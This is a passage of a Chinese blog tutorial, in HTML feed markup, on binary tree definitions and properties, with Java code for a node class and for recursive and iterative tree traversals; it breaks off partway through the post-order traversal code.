    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h3><p>树（Tree）是n（n&gt;&#x3D;0)个结点的有限集。n&#x3D;0时称为空树。在任意一颗非空树中：</p><ol><li>有且仅有一个特定的称为根（Root）的结点；</li><li>当n&gt;1时，其余结点可分为m(m&gt;0)个互不相交的有限集T1、T2、……、Tn，其中每一个集合本身又是一棵树，并且称为根的子树。</li><li>n&gt;0时根结点是唯一的，不可能存在多个根结点，数据结构中的树只能有一个根结点。</li><li>m&gt;0时，子树的个数没有限制，但它们一定是互不相交的。</li></ol><p>结点拥有的子树数目称为结点的度。<br><img src="/upload/2022/02/image-4e65df7ce6ae40c79dc9fb55c1ef4990.png" alt="image.png"></p><p>树中结点的最大层次数称为树的深度或高度，下图中树的深度为4<br><img src="/upload/2022/02/image-307377abcc33456ca9b4b5b0305f852a.png" alt="image.png"></p><h3 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h3><p>简单地理解，满足以下两个条件的树就是二叉树：</p><ol><li>本身是有序树；</li><li>树中包含的各个节点的度不能超过 2，即只能是 0、1 或者 2；</li></ol><p>二叉树具有以下几个性质：</p><ol><li>二叉树中，第 i 层最多有 2i-1 个结点。</li><li>如果二叉树的深度为 K，那么此二叉树最多有 2K-1 个结点。</li><li>二叉树中，终端结点数（叶子结点数）为 n0，度为 2 的结点数为 n2，则 n0&#x3D;n2+1。<br>(性质 3 的计算方法为：对于一个二叉树来说，除了度为 0 的叶子结点和度为 2 的结点，剩下的就是度为 1 的结点（设为 n1），那么总结点 n&#x3D;n0+n1+n2。<br>同时，对于每一个结点来说都是由其父结点分支表示的，假设树中分枝数为 B，那么总结点数 n&#x3D;B+1。而分枝数是可以通过 n1 和 n2 表示的，即 B&#x3D;n1+2 * n2。所以，n用另外一种方式表示为n&#x3D;n1+2 * n2+1。<br>两种方式得到的 n 值组成一个方程组，就可以得出 n0&#x3D;n2+1。)</li></ol><p>二叉树还可以继续分类，衍生出满二叉树和完全二叉树。</p><h4 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h4><p>如果二叉树中除了叶子结点，每个结点的度都为 2，则此二叉树称为满二叉树。示意图如下：<br><img src="/upload/2022/02/image-a7355330bce641018c4e1e7973cb190e.png" alt="image.png"></p><p>满二叉树除了满足普通二叉树的性质，还具有以下性质：</p><ol><li>满二叉树中第 i 层的节点数为 2n-1 个。</li><li>深度为 k 的满二叉树必有 2k-1 个节点 ，叶子数为 2k-1。</li><li>满二叉树中不存在度为 1 的节点，每一个分支点中都两棵深度相同的子树，且叶子节点都在最底层。</li><li>具有 n 个节点的满二叉树的深度为 log2(n+1)。</li></ol><h4 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h4><p>如果二叉树中除去最后一层节点为满二叉树，且最后一层的结点依次从左到右分布，则此二叉树被称为完全二叉树。<br><img src="/upload/2022/02/image-770b9aa90fd24541a5b6b8af62496108.png" alt="image.png"><br>完全二叉树除了具有普通二叉树的性质，它自身也具有一些独特的性质，比如说，n 个结点的完全二叉树的深度为 [log2 n]+1。<br>[log2 n] 表示取小于 log2 n 的最大整数。例如，[log2 4] &#x3D; 2，而 [log2 5] 结果也是 2。</p><p>对于任意一个完全二叉树来说，如果将含有的结点按照层次从左到右依次标号，对于任意一个结点 i ，完全二叉树还有以下几个结论成立：</p><ol><li>当 i&gt;1 时，父亲结点为结点 [i&#x2F;2] 。（i&#x3D;1 时，表示的是根结点，无父亲结点）</li><li>如果 2 * i&gt;n（总结点的个数），则结点 i 肯定没有左孩子（为叶子结点）；否则其左孩子是结点 2 * i 。</li><li>如果 2 * i+1&gt;n ，则结点 i 肯定没有右孩子；否则右孩子是结点 2 * i+1 。</li></ol><h2 id="节点的实现"><a href="#节点的实现" class="headerlink" title="节点的实现"></a>节点的实现</h2><p>二叉树的存储结构有两种，分别为顺序存储和链式存储。<br>二叉树的顺序存储，指的是使用顺序表（数组）存储二叉树。需要注意的是，只有完全二叉树才可以使用顺序表存储。<br>因为并不是每个二叉树都是完全二叉树，普通二叉树使用顺序表存储或多或多会存在空间浪费的现象，所以二叉树并不适合用数组存储。在本文中只用代码实现二叉树的链式存储。</p><p>链式存储中二叉树的每个节点都有三个主要数据，分别为节点数据，指向左子节点，指向右子节点，二叉树再由节点组成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;T&gt; &#123;</span><br><span class="line">T data;   <span class="comment">// 结点数据</span></span><br><span class="line">Node&lt;T&gt; left;  <span class="comment">// 指向左孩子结点</span></span><br><span class="line">Node&lt;T&gt; right;  <span class="comment">// 指向右孩子结点</span></span><br><span class="line"><span class="type">boolean</span> isFirst;  <span class="comment">// 用于非递归后序遍历</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(T data)</span> &#123; </span><br><span class="line"><span class="built_in">this</span>.data = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> data == <span class="literal">null</span> ? <span class="literal">null</span> : data.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Node) &#123;</span><br><span class="line">Node&lt;T&gt; temp = (Node&lt;T&gt;) obj;</span><br><span class="line"><span class="keyword">if</span> (data.equals(temp.data)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树的实现及遍历算法"><a href="#二叉树的实现及遍历算法" class="headerlink" title="二叉树的实现及遍历算法"></a>二叉树的实现及遍历算法</h2><p>树的遍历有四种方式:</p><pre><code>   (1) 先序遍历：先访问根节点，再访问左子树，最后访问右子树。   (2) 后序遍历：先左子树，再右子树，最后根节点。   (3) 中序遍历：先左子树，再根节点，最后右子树。   (4) 层序遍历：每一层从左到右访问每一个节点。</code></pre><p>二叉树的构建和遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryTree</span>&lt;E&gt; &#123;</span><br><span class="line"><span class="comment">// 二叉树的根结点     </span></span><br><span class="line"><span class="keyword">private</span> Node&lt;E&gt; root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BinaryTree</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">super</span>(); <span class="comment">//调用父类的无参构造方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据一个树的根结点复制构造树</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BinaryTree</span><span class="params">(Node&lt;E&gt; node)</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line"><span class="built_in">this</span>.root = copy(node);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 根据一个树的前序遍历结果复制构造树</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BinaryTree</span><span class="params">(<span class="type">char</span>[] preOrderStr)</span> &#123;</span><br><span class="line">root = createTreeByPreOrederStr(preOrderStr, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 根据一个树的前序遍历+中序遍历(或中序遍历+后序遍历)复制构造树</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BinaryTree</span><span class="params">(String s1, String s2, <span class="type">boolean</span> isPreIn)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (isPreIn) &#123;</span><br><span class="line">root = createBinaryTreeByPreAndIn(s1, s2);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">root = createBinaryTreeByInAndPost(s1, s2);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">根据广义表表达式创建树</span></span><br><span class="line"><span class="comment">广义表达式如下：</span></span><br><span class="line"><span class="comment">（1）表中的一个字母表示一个结点的数据信息；</span></span><br><span class="line"><span class="comment">（2）每个根节点作为由子树构成的表的名字放在表的前面；</span></span><br><span class="line"><span class="comment">（3）每个结点的左子树与右子树之间用逗号分开；如果只有右子树而无左子树，则逗号不能省略；</span></span><br><span class="line"><span class="comment">  例如：A(B(D),C(F(,E),G))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Node <span class="title function_">createBinaryTree</span><span class="params">(String exp)</span> &#123;</span><br><span class="line">LinkedList&lt;Node&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Node&gt;(); <span class="comment">// 辅助栈</span></span><br><span class="line"><span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 新结点</span></span><br><span class="line"><span class="type">Node</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 用于入栈</span></span><br><span class="line"><span class="type">Node</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 父亲结点</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">// true 表示链入到父结点的左孩子位置，false表示链入父结点的右孩子位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; exp.length(); i++) &#123; <span class="comment">// 逐个读入表达式的各个字符</span></span><br><span class="line"><span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> exp.charAt(i);</span><br><span class="line"><span class="keyword">switch</span> (c) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>: <span class="comment">// 当前节点有孩子节点，入栈以便设置其孩子</span></span><br><span class="line">stack.push(temp);</span><br><span class="line"><span class="comment">//此处用到了链表作为栈，并调用了push和pop方法，在Java封装好的LinkedList中链表确实有这两个方法，作用的增加头节点和删除头节点，可以作为栈来使用</span></span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>: <span class="comment">// 设置好了栈顶节点的孩子，出栈</span></span><br><span class="line">stack.pop();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>: <span class="comment">// 当前节点无孩子，不需要设置其孩子节点，因此不需要入栈</span></span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>: <span class="comment">// 创建根据内容创建节点</span></span><br><span class="line">node = <span class="keyword">new</span> <span class="title class_">Node</span>(c);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若树不存在，则创建树的根结点</span></span><br><span class="line"><span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">root = node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为栈顶节点链入子女</span></span><br><span class="line"><span class="keyword">if</span> (!stack.isEmpty()) &#123;</span><br><span class="line"><span class="keyword">if</span> (node != <span class="literal">null</span>) &#123; <span class="comment">// 当读入的是&#x27;(&#x27;、&#x27;)&#x27;、&#x27;,&#x27;字符时，略过</span></span><br><span class="line">parent = stack.peek();</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line">parent.left = node;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">parent.right = node;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">temp = node; <span class="comment">// 用于入栈</span></span><br><span class="line">node = <span class="literal">null</span>; <span class="comment">// node链入后，置空</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 广序/层次遍历，工作队列</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">levelOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">LinkedList&lt;Node&lt;E&gt;&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Node&lt;E&gt;&gt;(); <span class="comment">// 辅助队列</span></span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123;</span><br><span class="line">queue.add(root);</span><br><span class="line"><span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">Node&lt;E&gt; temp = queue.pop();</span><br><span class="line">sb.append(temp.data).append(<span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在遍历当前节点时，同时将其左右孩子入队</span></span><br><span class="line"><span class="keyword">if</span> (temp.left != <span class="literal">null</span>)</span><br><span class="line">queue.add(temp.left);</span><br><span class="line"><span class="keyword">if</span> (temp.right != <span class="literal">null</span>)</span><br><span class="line">queue.add(temp.right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString().trim();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历(递归)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">preOrder</span><span class="params">(Node&lt;E&gt; root)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(); <span class="comment">// 存到递归调用栈</span></span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123; <span class="comment">// 递归终止条件</span></span><br><span class="line">sb.append(root.data + <span class="string">&quot; &quot;</span>); <span class="comment">// 前序遍历当前结点</span></span><br><span class="line">sb.append(preOrder(root.left)); <span class="comment">// 前序遍历左子树</span></span><br><span class="line">sb.append(preOrder(root.right)); <span class="comment">// 前序遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历(迭代):非线性结构(树)，工作栈：当前节点入栈</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">preOrder</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">LinkedList&lt;Node&lt;E&gt;&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Node&lt;E&gt;&gt;(); <span class="comment">// 工作栈：记录回退路径</span></span><br><span class="line">Node&lt;E&gt; node = root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (node != <span class="literal">null</span> || !stack.isEmpty()) &#123; <span class="comment">// 迭代条件</span></span><br><span class="line"><span class="keyword">if</span> (node != <span class="literal">null</span>) &#123; <span class="comment">// 当前节点不为空</span></span><br><span class="line">sb.append(node.data + <span class="string">&quot; &quot;</span>); <span class="comment">// 访问当前节点</span></span><br><span class="line">stack.push(node); <span class="comment">// 当前节点入栈</span></span><br><span class="line">node = node.left; <span class="comment">// 遍历其左子树</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">node = stack.pop(); <span class="comment">// 弹出其父节点</span></span><br><span class="line">node = node.right; <span class="comment">// 遍历其右子树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历(递归)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">inOrder</span><span class="params">(Node&lt;E&gt; root)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(); <span class="comment">// 存到递归调用栈</span></span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123; <span class="comment">// 递归终止条件</span></span><br><span class="line">sb.append(inOrder(root.left)); <span class="comment">// 中序遍历左子树</span></span><br><span class="line">sb.append(root.data + <span class="string">&quot; &quot;</span>); <span class="comment">// 中序遍历当前结点</span></span><br><span class="line">sb.append(inOrder(root.right)); <span class="comment">// 中序遍历右子树</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历(迭代)：非线性结构(树)，工作栈：当前节点入栈</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">inOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">LinkedList&lt;Node&lt;E&gt;&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Node&lt;E&gt;&gt;(); <span class="comment">// 工作栈：记录回退路径</span></span><br><span class="line">Node&lt;E&gt; node = root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (node != <span class="literal">null</span> || !stack.isEmpty()) &#123; <span class="comment">// 迭代条件</span></span><br><span class="line"><span class="keyword">if</span> (node != <span class="literal">null</span>) &#123; <span class="comment">// 当前节点不为空</span></span><br><span class="line">stack.push(node); <span class="comment">// 当前节点入栈</span></span><br><span class="line">node = node.left; <span class="comment">// 遍历其左子树</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">node = stack.pop(); <span class="comment">// 父节点弹栈</span></span><br><span class="line">sb.append(node.data + <span class="string">&quot; &quot;</span>); <span class="comment">// 访问父节点</span></span><br><span class="line">node = node.right; <span class="comment">// 遍历访问其右子树</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历(递归)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">postOrder</span><span class="params">(Node&lt;E&gt; root)</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(); <span class="comment">// 存到递归调用栈</span></span><br><span class="line"><span class="keyword">if</span> (root != <span class="literal">null</span>) &#123; <span class="comment">// 递归终止条件</span></span><br><span class="line">sb.append(postOrder(root.left)); <span class="comment">// 后序遍历左子树</span></span><br><span class="line">sb.append(postOrder(root.right)); <span class="comment">// 后序遍历右子树</span></span><br><span class="line">sb.append(root.data + <span class="string">&quot; &quot;</span>); <span class="comment">// 后序遍历当前结点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历(迭代):非线性结构(树)，工作栈：当前节点入栈</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">postOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">LinkedList&lt;Node&lt;E&gt;&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Node&lt;E&gt;&gt;(); <span class="comment">// 记录回退路径的工作栈</span></span><br><span class="line">Node&lt;E&gt; node = root;</span><br><span class="line"><span class="keyword">while</span> (node != <span class="literal">null</span> || !stack.isEmpty()) &#123; <span class="comment">// 迭代条件</span></span><br><span class="line"><span class="keyword">if</span> (node != <span class="literal">null</span>) &#123; <span class="comment">// 当前节点不为空</span></span><br><span class="line">node.isFirst = <span class="literal">true</span>; <span class="comment">// 首次访问该节点，记为true</span></span><br><span class="line">stack.push(node); <span class="comment">// 压栈操作</span></span><br><span class="line">node = node.left; <span class="comment">// 继续遍历左子树</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 当前节点为空但工作栈不为空</span></span><br><span class="line">node = stack.pop(); <span class="comment">// 当前节点弹栈</span></span><br><span class="line"><span class="keyword">if</span> (node.isFirst) &#123;</span><br><span class="line">node.isFirst = <span class="literal">false</span>; <span class="comment">// 第二次访问该节点,改为false</span></span><br><span class="line">stack.push(node); <span class="comment">// 只有在第三次才访问，因此，前节点再次压栈</span></span><br><span class="line">node = node.right; <span class="comment">// 访问该节点的右子树</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 第三次访问该节点</span></span><br><span class="line">sb.append(node.data + <span 